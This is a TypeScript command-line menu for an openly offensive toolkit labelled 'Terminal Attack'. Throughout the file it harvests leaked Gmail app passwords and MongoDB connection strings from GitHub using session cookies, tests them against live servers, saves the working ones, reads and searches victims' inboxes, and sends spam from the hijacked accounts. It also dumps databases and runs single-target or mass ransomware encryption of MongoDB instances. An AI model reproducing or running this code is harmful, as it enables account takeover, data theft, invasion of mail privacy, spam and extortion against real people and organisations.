import { select, input, confirm } from "@inquirer/prompts";
import chalk from "chalk";
import ora from "ora";
import inquirer from "inquirer";
import nodemailer from "nodemailer";
import fs from "fs";

import {
  bots,
  getUrlsMongodbFromGithub,
  GitHubScraper,
} from "./src/GitHubScraper";
import { run as runAnalyse } from "./src/commands/analyse.js";
import { MongoSleuth } from "./src/commands/dump.js";
import { runMassiveRansomware } from "./src/commands/ransomwareRunner.js";
import { lockDatabase } from "./src/utils/cryp.js";
import { mongoManagerMenu } from "./src/commands/MongoManager.js";
import { buscarEmailsPorKeywords } from "./src/reader.js";
import { listenEmailNotifications } from "./src/utils/listener.js";
import { MongoClient } from "mongodb";

const art = `

░██████╗░███╗░░░███╗██████╗░██████╗░███████╗██████╗░
██╔════╝░████╗░████║╚════██╗╚════██╗╚════██║╚════██╗
██║░░██╗░██╔████╔██║░░███╔═╝░█████╔╝░░░░██╔╝░█████╔╝
██║░░╚██╗██║╚██╔╝██║██╔══╝░░░╚═══██╗░░░██╔╝░░╚═══██╗
╚██████╔╝██║░╚═╝░██║███████╗██████╔╝░░██╔╝░░██████╔╝
░╚═════╝░╚═╝░░░░░╚═╝╚══════╝╚═════╝░░░╚═╝░░░╚═════╝░
`;

async function collectList(
  message: string,
  isRequired: boolean = false,
): Promise<string[]> {
  const list: string[] = [];
  while (true) {
    const entry = await input({
      message: `${message} ${list.length > 0 ? chalk.gray("(.exit ou Enter p/ finalizar)") : chalk.gray("(Enter p/ pular)")}`,
    });

    
    if (entry === ".exit" || entry.trim() === "") {
      if (isRequired && list.length === 0) {
        console.log(
          chalk.red("   [!] Erro: Você precisa adicionar ao menos um item."),
        );
        continue;
      }
      break;
    }

    list.push(entry.trim());
    console.log(chalk.green(`   ✔ [${entry.trim()}] Adicionado`));
  }
  return list;
}

function isEmailDuplicate(
  email: string,
  filePath: string = "emails_validos.txt",
): boolean {
  if (!fs.existsSync(filePath)) return false;
  const content = fs.readFileSync(filePath, "utf-8");
  
  const regex = new RegExp(`^${email.toLowerCase()}:`, "m");
  return regex.test(content);
}

function isMongoDuplicate(
  uri: string,
  filePath: string = "mongodb_hits_success.txt",
): boolean {
  if (!fs.existsSync(filePath)) return false;
  const content = fs.readFileSync(filePath, "utf-8");
  
  const escapedUri = uri.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const regex = new RegExp(`^${escapedUri}$`, "m");
  return regex.test(content);
}

async function removeDuplicates(filePath: string) {
  if (!fs.existsSync(filePath)) {
    console.log(chalk.red(`[-] Arquivo ${filePath} não encontrado.`));
    return;
  }

  const content = fs
    .readFileSync(filePath, "utf-8")
    .split("\n")
    .map((line) => line.trim())
    .filter(Boolean);

  const initialCount = content.length;
  
  const uniqueItems = [...new Set(content)];
  const finalCount = uniqueItems.length;
  const removed = initialCount - finalCount;

  console.log(chalk.cyan(`\n[*] Analisando duplicatas em: ${filePath}`));
  console.log(chalk.yellow(`[!] Total de linhas: ${initialCount}`));
  console.log(chalk.green(`[+] Linhas únicas: ${finalCount}`));
  console.log(chalk.red(`[-] Duplicatas removidas: ${removed}`));

  if (removed === 0) {
    console.log(
      chalk.gray("[~] O arquivo já está limpo. Nenhuma alteração necessária."),
    );
    return;
  }

  const action = await select({
    message: "Deseja aplicar a limpeza?",
    choices: [
      { name: `Substituir ${filePath} (Recomendado)`, value: "replace" },
      { name: "Salvar em novo arquivo", value: "new" },
      { name: "Cancelar", value: "cancel" },
    ],
  });

  if (action === "replace") {
    fs.writeFileSync(filePath, uniqueItems.join("\n") + "\n");
    console.log(chalk.green(`\n✔ Arquivo ${filePath} sanitizado com sucesso!`));
  } else if (action === "new") {
    const newName = await input({
      message: "Nome do novo arquivo:",
      default: `unique_${filePath}`,
    });
    fs.writeFileSync(newName, uniqueItems.join("\n") + "\n");
    console.log(chalk.green(`\n✔ Dados únicos salvos em ${newName}`));
  }
}

async function cleanVariables(filePath: string, type: "email" | "mongo") {
  if (!fs.existsSync(filePath)) {
    console.log(chalk.red(`[-] Arquivo ${filePath} não encontrado.`));
    return;
  }

  const content = fs
    .readFileSync(filePath, "utf-8")
    .split("\n")
    .filter(Boolean);
  const validItems: string[] = [];
  const spinner = ora(`Iniciando limpeza de ${type}...`).start();

  for (const line of content) {
    spinner.text = `Testando: ${line.substring(0, 40)}...`;

    if (type === "email") {
      const [user, pass] = line.split(":");
      try {
        const transporter = nodemailer.createTransport({
          host: "smtp.gmail.com",
          port: 587,
          secure: false,
          auth: { user, pass },
          connectionTimeout: 3000,
        });
        await transporter.verify();
        validItems.push(line);
      } catch (err) {}
    } else if (type === "mongo") {
      try {
        const client = new MongoClient(line, {
          connectTimeoutMS: 2000,
          serverSelectionTimeoutMS: 2000,
        });
        await client.connect();
        await client.db("admin").command({ ping: 1 });
        await client.close();
        validItems.push(line);
      } catch (err) {}
    }
  }

  spinner.succeed(
    `Scanner finalizado. Itens válidos: ${validItems.length}/${content.length}`,
  );

  const action = await select({
    message: "O que deseja fazer com os resultados válidos?",
    choices: [
      { name: "Substituir arquivo original", value: "replace" },
      { name: "Criar novo arquivo", value: "new" },
      { name: "Cancelar", value: "cancel" },
    ],
  });

  if (action === "replace") {
    fs.writeFileSync(filePath, validItems.join("\n") + "\n");
    console.log(chalk.green(`[+] Arquivo ${filePath} atualizado!`));
  } else if (action === "new") {
    const newName = await input({
      message: "Nome do novo arquivo:",
      default: `cleaned_${filePath}`,
    });
    fs.writeFileSync(newName, validItems.join("\n") + "\n");
    console.log(chalk.green(`[+] Novo arquivo ${newName} criado!`));
  }
}

async function main() {
  console.clear();
  console.log(chalk.red.bold("\n 💀 Terminal Attack GM2373_404\n"));
  console.log(chalk.red.bold(art));

  const choice = await select({
    message: "Selecione a fase do ataque:",
    choices: [
      { name: "   Get Urls By Github", value: "git" },
      { name: "   Emails", value: "emails" },
      { name: "   MongoDb", value: "mongodb_menu" },
      { name: "   Ransomware", value: "ransomware_menu" },
      new inquirer.Separator(),
      { name: chalk.gray("   Sair"), value: "exit" },
    ],
  });

  console.clear();

  if (choice === "exit") process.exit();

  switch (choice) {
    case "emails":
      const emailAction = await select({
        message: "Opções de Email:",
        choices: [
          { name: "   TestEmail (Registrar)", value: "test" },
          { name: "   Single Send (Usar salvo)", value: "single_send" },
          { name: "   SPAM emails (Usar todos)", value: "spam" },
          { name: "   Search emails", value: "search" },
          {
            name: " 🔥 Auto-Collect & Test (GitHub -> Verificador)",
            value: "auto_collect",
          },
          
          {
            name: " 🔥 Massive Validation (Arquivo local)",
            value: "massive_validation",
          },
          { name: " 📡 Listen Email Notification", value: "listen" },
          { name: " 🧹 Clean variables (Re-validar lista)", value: "clean" },
          { name: " 📦 Remove Duplicates (Emails)", value: "dedup_email" },
          { name: chalk.red("   Delete Email"), value: "delete" },
          { name: chalk.gray("   Voltar"), value: "back" },
        ],
      });

      

      
      if (emailAction === "dedup_email") {
        await removeDuplicates("emails_validos.txt");
      }

      if (emailAction === "back") break;

      if (emailAction === "clean") {
        await cleanVariables("emails_validos.txt", "email");
      }

      if (emailAction === "auto_collect") {
        const validFile = "emails_validos.txt";
        const tempFile = "temp_scraped_emails.txt";

        console.log(
          chalk.blue.bold("\n--- 🕵️ Configuração de Busca Automatizada ---"),
        );

        const keywords = await collectList(
          "Keywords para buscar no GitHub (ex: EMAIL_USER=be):",
          true,
        );

        const botIndex = Number(
          await input({ message: "Índice do Bot (Cookie):", default: "0" }),
        );

        
        const spinner = ora("Iniciando Scraper no GitHub...").start();
        const selectedCookie = bots[botIndex]?.replace(/^Cookie:\s*/i, "");
        const rawHeaders = [
          `Host: github.com`,
          `Cookie: ${selectedCookie}`,
        ].join("\n");

        const bot = new GitHubScraper();
        try {
          await bot.main(
            rawHeaders,
            keywords,
            tempFile,
            7,
            [".env", ".md", ".txt"],
            ["example", "YOUR_"],
            1,
            true,
          );
          spinner.succeed(
            chalk.green(`[+] Scraping finalizado. Resultados em ${tempFile}`),
          );

          if (!fs.existsSync(tempFile)) {
            console.log(chalk.red("[-] Nenhum arquivo de raspagem gerado."));
            return; 
          }

          const content = fs.readFileSync(tempFile, "utf-8");
          const blocks = content.split(
            "------------------------------------------------------------",
          );

          
          const existingEmails = new Set(
            fs.existsSync(validFile)
              ? fs
                  .readFileSync(validFile, "utf-8")
                  .split("\n")
                  .filter(Boolean)
                  .map((line: any) => line.split(":")[0].toLowerCase())
              : [],
          );

          console.log(
            chalk.cyan(
              `[*] Validando ${blocks.length} blocos (Filtro de duplicatas ativo)...\n`,
            ),
          );

          const REGEX_EMAIL = /\b[a-zA-Z0-9._%+-]+@gmail\.com\b/i;
          const REGEX_PASS =
            /\b([a-z]{4}[- ]?[a-z]{4}[- ]?[a-z]{4}[- ]?[a-z]{4}|[a-z]{16})\b/;

          for (const block of blocks) {
            const emailMatch = block.match(REGEX_EMAIL);
            const passMatch = block.match(REGEX_PASS);

            if (emailMatch && passMatch) {
              const email = emailMatch[0].toLowerCase();
              const cleanPass = passMatch[0].replace(/[^a-z]/g, "");

              
              if (existingEmails.has(email)) {
                console.log(
                  chalk.yellow(`   [!] Ignorado: ${email} já registrado.`),
                );
                continue;
              }

              if (cleanPass.length === 16) {
                const vSpinner = ora(`Testando: ${email}`).start();
                try {
                  const transporter = nodemailer.createTransport({
                    host: "smtp.gmail.com",
                    port: 587,
                    secure: false,
                    auth: { user: email, pass: cleanPass },
                    connectionTimeout: 5000,
                  });

                  await transporter.verify();

                  
                  fs.appendFileSync(validFile, `${email}:${cleanPass}\n`);
                  existingEmails.add(email); 

                  vSpinner.succeed(chalk.green(`HIT! ${email} salvo.`));
                } catch (err) {
                  vSpinner.fail(chalk.gray(`Falha: ${email}`));
                }
              }
            }
          }

          const keep = await confirm({
            message: "Manter arquivo temporário?",
            default: false,
          });
          if (!keep) fs.unlinkSync(tempFile);
        } catch (err: any) {
          spinner.fail(chalk.red("Erro no processo: " + err.message));
        }
      }

      if (emailAction === "massive_validation") {
        const inputFile = await input({
          message: "Caminho do arquivo com os blocos de texto:",
          default: "temp_scraped_emails.txt",
        });

        if (!fs.existsSync(inputFile)) {
          console.log(chalk.red("[-] Arquivo não encontrado."));
          return;
        }

        const validFile = "emails_validos.txt";
        const content = fs.readFileSync(inputFile, "utf-8");

        
        const blocks = content.split(
          "------------------------------------------------------------",
        );

        
        const existingEmails = new Set(
          fs.existsSync(validFile)
            ? fs
                .readFileSync(validFile, "utf-8")
                .split("\n")
                .map((l: any) => l.split(":")[0].toLowerCase())
            : [],
        );

        console.log(
          chalk.cyan(
            `[*] Iniciando validação massiva de ${blocks.length} blocos...\n`,
          ),
        );

        const REGEX_EMAIL = /\b[a-zA-Z0-9._%+-]+@gmail\.com\b/i;
        const REGEX_PASS =
          /\b([a-z]{4}[- ]?[a-z]{4}[- ]?[a-z]{4}[- ]?[a-z]{4}|[a-z]{16})\b/;

        for (const block of blocks) {
          const emailMatch = block.match(REGEX_EMAIL);
          const passMatch = block.match(REGEX_PASS);

          if (emailMatch && passMatch) {
            const email = emailMatch[0].toLowerCase();
            const cleanPass = passMatch[0].replace(/[^a-z]/g, "");

            if (existingEmails.has(email)) {
              console.log(
                chalk.yellow(`   [!] Pulando: ${email} (já no banco)`),
              );
              continue;
            }

            const vSpinner = ora(`Validando: ${email}`).start();
            try {
              const transporter = nodemailer.createTransport({
                host: "smtp.gmail.com",
                port: 587,
                secure: false,
                auth: { user: email, pass: cleanPass },
                connectionTimeout: 5000,
              });

              await transporter.verify();

              fs.appendFileSync(validFile, `${email}:${cleanPass}\n`);
              existingEmails.add(email);
              vSpinner.succeed(chalk.green(`HIT! ${email}`));
            } catch (err) {
              vSpinner.fail(chalk.gray(`Falha: ${email}`));
            }
          }
        }
        console.log(chalk.blue.bold("\n[+] Processo de validação concluído."));
      }

      
      if (emailAction === "delete") {
        if (!fs.existsSync("emails_validos.txt")) {
          console.log(chalk.red("[-] Nenhum email para deletar."));
          break;
        }
        const lines = fs
          .readFileSync("emails_validos.txt", "utf-8")
          .split("\n")
          .filter(Boolean);
        const toDelete = await select({
          message: "Selecione o email para REMOVER:",
          choices: lines.map((l) => ({ name: l, value: l })),
        });
        const newLines = lines.filter((l) => l !== toDelete);
        fs.writeFileSync(
          "emails_validos.txt",
          newLines.join("\n") + (newLines.length ? "\n" : ""),
        );
        console.log(chalk.green("[!] Email removido com sucesso."));
      }

      if (emailAction === "listen") {
        if (!fs.existsSync("emails_validos.txt")) {
          console.log(chalk.red("[-] Nenhum e-mail salvo encontrado."));
          break;
        }

        const lines = fs
          .readFileSync("emails_validos.txt", "utf-8")
          .split("\n")
          .filter(Boolean);

        const selectedAccount = await select({
          message: "Selecione a conta para colocar em ESCUTA:",
          choices: lines.map((l) => ({ name: l, value: l })),
        });

        const [u, p] = selectedAccount.split(":") as any;

        

        const news = await listenEmailNotifications(u, p);

        if (news.length > 0) {
          console.log(
            chalk.green(
              `\n\n[!] Escuta finalizada. ${news.length} emails capturados.`,
            ),
          );

          let browsing = true;
          while (browsing) {
            const viewChoice = await select({
              message: "Gerenciar emails capturados:",
              choices: [
                {
                  name: "🔍 Selecionar e ler email (Ver conteúdo)",
                  value: "read",
                },
                { name: "💾 Salvar todos em .txt", value: "save" },
                {
                  name: chalk.gray("⬅ Voltar ao menu principal"),
                  value: "back",
                },
              ],
            });

            if (viewChoice === "back") {
              browsing = false;
              break;
            }

            if (viewChoice === "read") {
              const targetMsg = await select({
                message: "Escolha qual email deseja abrir:",
                choices: [
                  ...news.map((n, i) => ({
                    name: `[${i + 1}] De: ${n.from} | Assunto: ${n.subject}`,
                    value: i,
                  })),
                  { name: chalk.red(" Escolher outra opção..."), value: -1 },
                ],
              });

              if (targetMsg === -1) continue;

              console.clear();
              console.log(chalk.yellow.bold("\n--- CABEÇALHO ---"));
              console.log(chalk.white(`DE: ${news[targetMsg].from}`));
              console.log(chalk.white(`ASSUNTO: ${news[targetMsg].subject}`));
              console.log(chalk.yellow.bold("\n--- CONTEÚDO (RAW SOURCE) ---"));
              console.log(chalk.cyan(news[targetMsg].body));
              console.log(
                chalk.yellow.bold("\n-----------------------------\n"),
              );

              await input({
                message: chalk.gray(
                  "Pressione Enter para voltar à lista de capturados...",
                ),
              });
              console.clear();
            }

            if (viewChoice === "save") {
              const logName = await input({
                message: "Nome do arquivo para salvar a sessão:",
                default: `session_${u.split("@")[0]}.txt`,
              });

              const content = news
                .map(
                  (n: any) =>
                    `DE: ${n.from}\nASSUNTO: ${n.subject}\nCONTEÚDO:\n${n.body}\n${"=".repeat(40)}\n`,
                )
                .join("\n");

              fs.writeFileSync(logName, content);
              console.log(
                chalk.green(
                  `[+] Todos os ${news.length} emails salvos em ${logName}`,
                ),
              );
            }
          }
        } else {
          console.log(
            chalk.gray("\n[-] Nenhum email chegou durante a sessão de escuta."),
          );
        }
      }

      if (emailAction === "test") {
        while (true) {
          const user = await input({
            message: "Email:",
            default: "digite o email ou .exit pra sair",
          });

          if (user === ".exit") break;

          const pass = await input({
            message: "Senha:",
            default: "digite a senha ou .exit pra sair",
          });

          if (pass === ".exit") break;

          if (isEmailDuplicate(user)) {
            console.log(
              chalk.red(`\n [X] Erro: O e-mail ${user} já está registrado!\n`),
            );
            continue; 
          }

          const spinner = ora("Validando...").start();
          try {
            const transporter = nodemailer.createTransport({
              service: "gmail",
              auth: { user, pass },
            });
            await transporter.verify();
            fs.appendFileSync("emails_validos.txt", `${user}:${pass}\n`);
            spinner.succeed(
              chalk.green("Válido e salvo em emails_validos.txt"),
            );
          } catch (err: any) {
            spinner.fail(chalk.red("Erro: " + err.message));
          }
          const enter = await input({
            message: "Continuar",
          });
          console.clear();
        }
      }

      if (emailAction === "single_send" || emailAction === "spam") {
        if (!fs.existsSync("emails_validos.txt")) {
          console.log(chalk.red("[-] Nenhum email salvo encontrado."));
          break;
        }
        const lines = fs
          .readFileSync("emails_validos.txt", "utf-8")
          .split("\n")
          .filter(Boolean);
        const subject = await input({ message: "Subject de destino:" });
        const target = await input({ message: "Email de destino:" });
        const content = await input({ message: "Conteúdo da mensagem:" });

        if (emailAction === "single_send") {
          const li = lines.map((l) => ({ name: l, value: l }));
          li.push({ name: "exit", value: "exit" });
          const selected = await select({
            message: "Escolha a credencial:",
            choices: li,
          });

          if (selected === "exit") break;

          const [u, p] = selected.split(":");

          const s = ora("Enviando...").start();
          try {
            const transporter = nodemailer.createTransport({
              service: "gmail",
              auth: { user: u, pass: p },
            });
            await transporter.sendMail({
              from: u,
              to: target,
              subject,
              text: content,
            });
            s.succeed(chalk.green("Enviado!"));
          } catch (err: any) {
            s.fail(chalk.red(err.message));
          }
        } else if (emailAction === "spam") {
          console.log(
            chalk.yellow(`[*] Iniciando SPAM com ${lines.length} contas...`),
          );
          for (const line of lines) {
            const [u, p] = line.split(":");
            const s = ora(`Enviando de: ${u}`).start();
            try {
              const transporter = nodemailer.createTransport({
                service: "gmail",
                auth: { user: u, pass: p },
              });
              await transporter.sendMail({
                from: u,
                to: target,
                subject,
                text: content,
              });
              s.succeed();
            } catch (err: any) {
              s.fail(chalk.red(`Falha: ${u}`));
            }
          }
        }
      }

      if (emailAction === "search") {
        if (!fs.existsSync("emails_validos.txt")) {
          console.log(chalk.red("[-] Nenhum e-mail salvo encontrado."));
          break;
        }

        const searchKeywords = await collectList(
          "Keywords para buscar (ex: @nubank, senha):",
          true,
        );

        
        const outputFile = await input({
          message: "Nome do arquivo para salvar os resultados:",
          default: "search_results.txt",
        });

        const lines = fs
          .readFileSync("emails_validos.txt", "utf-8")
          .split("\n")
          .filter(Boolean);
        console.log(
          chalk.yellow(
            `[*] Iniciando busca profunda em ${lines.length} contas...\n`,
          ),
        );

        for (const line of lines) {
          const [u, p] = line.split(":") as any;
          const s = ora(`Acessando: ${u}`).start();

          try {
            
            const results = await buscarEmailsPorKeywords(searchKeywords, u, p);

            if (results && results.length > 0) {
              const dataToSave = results
                .map(
                  (res) =>
                    `CONTA: ${u}\nDE: ${res.from}\nASSUNTO: ${res.subject}\nID: ${res.id}\n---------------------------\n`,
                )
                .join("");

              fs.appendFileSync(outputFile, dataToSave);
              s.succeed(
                chalk.green(`Encontrados ${results.length} matches em ${u}`),
              );
            } else {
              s.info(chalk.gray(`Nenhum match em ${u}`));
            }
          } catch (err: any) {
            s.fail(chalk.red(`Erro em ${u}: ${err.message}`));
          }
        }
        console.log(
          chalk.cyan(`\n[!] Relatório completo salvo em: ${outputFile}`),
        );
      }

      break;

    case "mongodb_menu":
      const mongoChoice = await select({
        message: "Selecione a opção MongoDb:",
        choices: [
          { name: "   Start Analyse Urls", value: "analyse" },
          { name: "   Dump Massive", value: "dump" },
          { name: "   MongoDBs URIs", value: "mng_manager" },
          {
            name: " 🔥 Auto-Collect & Test (GitHub -> Verificador)",
            value: "auto_collect_mongo",
          },
          {
            name: " 🧹 Clean variables (Re-validar URIs)",
            value: "clean_mongo",
          },
          { name: " 📦 Remove Duplicates (URIs)", value: "dedup_mongo" },

          { name: chalk.gray("   Voltar"), value: "back" },
        ],
      });

      if (mongoChoice === "dedup_mongo") {
        await removeDuplicates("mongodb_hits_success.txt");
      }

      if (mongoChoice === "mng_manager") await mongoManagerMenu();
      if (mongoChoice === "analyse") {
        const inputFile = await input({
          message: "Arquivo para análise:",
          default: "resultsGits.txt",
        });
        await runAnalyse(inputFile);
      }

      
      //

      if (mongoChoice === "auto_collect_mongo") {
        const validFile = "mongodb_hits_success.txt";
        const tempFile = "temp_mongo_scraped.txt";

        console.log(
          chalk.blue.bold("\n--- 🕵️ Auto-Collect MongoDB (GitHub) ---"),
        );

        const keywords = await collectList(
          "Keywords (ex: MONGO_URI=mongodb+srv://):",
          true,
        );
        const botIndex = Number(
          await input({ message: "Índice do Bot (Cookie):", default: "0" }),
        );

        const selectedCookie = bots[botIndex]?.replace(/^Cookie:\s*/i, "");
        const rawHeaders = [
          `Host: github.com`,
          `Cookie: ${selectedCookie}`,
        ].join("\n");

        const scraper = new GitHubScraper();
        const spinner = ora("Buscando no GitHub...").start();

        try {
          
          await scraper.main(
            rawHeaders,
            keywords,
            tempFile,
            5,
            [".env", ".js", ".txt"],
            ["example", "your_"],
            1,
            true,
          );
          spinner.succeed(
            chalk.green(`Scraping finalizado. Analisando blocos...`),
          );

          if (!fs.existsSync(tempFile)) return;

          const content = fs.readFileSync(tempFile, "utf-8");
          const blocks = content.split("-".repeat(60));

          
          const REGEX_MONGO = /mongodb(?:\+srv)?:\/\/[^\s"'`]+(?=[^"'`]*)/gi;

          let stats = { valid: 0, invalid: 0 };

          for (const block of blocks) {
            const matches: any = block.match(REGEX_MONGO);
            if (!matches) continue;

            for (const rawUri of matches) {
              
              const cleanUri = rawUri
                .replace(/[…\s]/g, "")
                .split(/["'`]/)[0]
                .trim();

              if (isMongoDuplicate(cleanUri, validFile)) {
                console.log(
                  chalk.yellow(
                    `\r\x1b[K [!] Ignorado (Já existe): ${cleanUri.substring(0, 40)}...`,
                  ),
                );
                continue;
              }

              const vSpinner = ora(
                `Testando: ${cleanUri.substring(0, 50)}...`,
              ).start();

              try {
                const client = new MongoClient(cleanUri, {
                  connectTimeoutMS: 2500,
                  serverSelectionTimeoutMS: 2500,
                  family: 4,
                });

                await client.connect();
                await client.db("admin").command({ ping: 1 });
                await client.close();

                
                fs.appendFileSync(validFile, `${cleanUri}\n`);
                stats.valid++;
                vSpinner.succeed(chalk.green(`HIT! Conexão estabelecida.`));
              } catch (err) {
                stats.invalid++;
                vSpinner.fail(chalk.gray(`Falha na conexão.`));
              }
            }
          }

          console.log(
            chalk.bold(
              `\n Relatório Final: ${chalk.green(stats.valid + " Hits")} | ${chalk.red(stats.invalid + " Falhas")}`,
            ),
          );

          if (!(await confirm({ message: "Manter arquivo temporário?" })))
            fs.unlinkSync(tempFile);
        } catch (err: any) {
          spinner.fail(chalk.red("Erro: " + err.message));
        }
      }

      if (mongoChoice === "clean_mongo") {
        await cleanVariables("mongodb_hits_success.txt", "mongo");
      }

      if (mongoChoice === "dump") {
        const dumpInput = await input({
          message: "Arquivo input:",
          default: "privileges_report.txt",
        });
        const sleuth = new MongoSleuth();
        await sleuth.iniciar(dumpInput);
      }
      break;

    case "ransomware_menu":
      const ransomMode = await select({
        message: "Selecione o tipo de operação de Ransomware:",
        choices: [
          { name: "🎯 URI Especificada (Alvo Único)", value: "single" },
          { name: "💀 Ransomware Massive (Relatório)", value: "massive" },
          { name: chalk.gray("⬅ Voltar"), value: "back" },
        ],
      });
      if (ransomMode === "back") break;
      const keySecret = await input({
        message: chalk.bold("Defina a CHAVE SECRETA:"),
        validate: (v) => v.length > 0 || "Obrigatório!",
      });
      const ransomMsg = await input({
        message: "Mensagem:",
        default: "Dados criptografados.",
      });
      const contactInfo = await input({
        message: "Contato:",
        default: "estudante@cybersec.edu",
      });

      if (ransomMode === "single") {
        const targetUri = await input({
          message: "URI MongoDB:",
          validate: (v) => v.includes("mongodb"),
        });
        if (await confirm({ message: chalk.red("⚠️ CONFIRMAR?") })) {
          const s = ora("Injetando...").start();
          try {
            await lockDatabase(targetUri, keySecret, ransomMsg, contactInfo);
            s.succeed("Finalizado!");
          } catch (e: any) {
            s.fail(e.message);
          }
        }
      } 
      else if (ransomMode === "massive") {
        const inputFile = await input({
          message: "Arquivo de entrada (relatório de privilégios):",
          default: "privileges_report.txt",
        });

        const logFile = await input({
          message: "Arquivo de log para salvar os sucessos:",
          default: "compromised_log.txt",
        });

        const s = ora("Iniciando operação massiva...").start();
        try {
          const count = await runMassiveRansomware(
            keySecret,
            ransomMsg,
            contactInfo,
            inputFile,
            logFile,
          );
          s.succeed(`Operação finalizada! ${count} alvos processados.`);
        } catch (err: any) {
          s.fail(`Erro na operação massiva: ${err.message}`);
        }
      }
      break;

    case "git":
      const gitMode = await select({
        message: "Selecione o modo de busca GitHub:",
        choices: [
          { name: "🍃 MongoDB Scanner (Padrão)", value: "mongo_default" },
          { name: "🔍 Search Personalized (Custom)", value: "custom" },
          { name: chalk.gray("⬅ Voltar"), value: "back" },
        ],
      });

      if (gitMode === "back") break;

      
      let keywords: string[] = [];
      let whitelist: string[] = [];
      let blacklist: string[] = [];
      let pageEnd = 5;
      let filename = "resultsGits.txt";
      let pageInitial = 1;
      let botIndex = 0;
      let isHeadless = true;

      if (gitMode === "mongo_default") {
        keywords = [
          "MONGO_DB_URI=mongodb+srv://",
          "MONGODB_URI=mongodb+srv://",
          "MONGO_KEY=mongodb+srv://",
          "MONGODB_CONNECTION=mongodb+srv://",
        ];
        whitelist = [".env", "config.js", ".txt", ".md"];
        blacklist = [
          "username",
          "//[",
          "USERNAME",
          "your_password",
          "xxxxxxxx",
        ];

        
        
        
        botIndex = Number(
          await input({ message: "Índice do Bot (Cookie):", default: "0" }),
        );
      } else {
        console.log(chalk.blue.bold("\n--- Configuração de Keywords ---"));
        keywords = await collectList("Quais variáveis buscar?", true);

        console.log(
          chalk.blue.bold("\n--- Configuração de Filtros (Whitelist) ---"),
        );
        whitelist = await collectList("Whitelist (ex: .env, config.js):");

        console.log(
          chalk.blue.bold("\n--- Configuração de Bloqueios (Blacklist) ---"),
        );
        blacklist = await collectList("Blacklist (ex: password, xxxx):");

        console.log(chalk.blue.bold("\n--- Parâmetros de Execução ---"));
        filename = await input({
          message: "Nome do arquivo de saída:",
          default: "custom_results.txt",
        });
        
        
        
        pageInitial = Number(
          await input({ message: "Página Inicial:", default: "1" }),
        );
        botIndex = Number(
          await input({
            message: `Índice do Bot (0 a ${bots.length - 1}):`,
            default: "0",
          }),
        );
        isHeadless = await confirm({
          message: "Executar em modo Headless (oculto)?",
          default: true,
        });
      }

      
      const selectedCookie = bots[botIndex]?.replace(/^Cookie:\s*/i, "");
      if (!selectedCookie) {
        console.log(chalk.red("[-] Índice de bot inválido!"));
        break;
      }

      const rawHeaders = [
        `Host: github.com`,
        `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
        `Cookie: ${selectedCookie}`,
        `Connection: keep-alive`,
      ].join("\n");

      console.clear();

      console.log(
        chalk.yellow(
          `\n[*] Iniciando Scraper com ${keywords.length} keywords...`,
        ),
      );

      const bot = new GitHubScraper();
      try {
        await bot.main(
          rawHeaders,
          keywords,
          filename,
          pageEnd,
          whitelist,
          blacklist,
          pageInitial,
          isHeadless,
        );
      } catch (err: any) {
        console.error(
          chalk.red("\n[-] Falha crítica na execução:"),
          err.message,
        );
      }
      break;
  }

  console.log("\n");
  if (await confirm({ message: "Deseja voltar ao menu principal?" })) main();
}

main().catch((err) => console.error(chalk.red("\n[-] Erro:"), err));
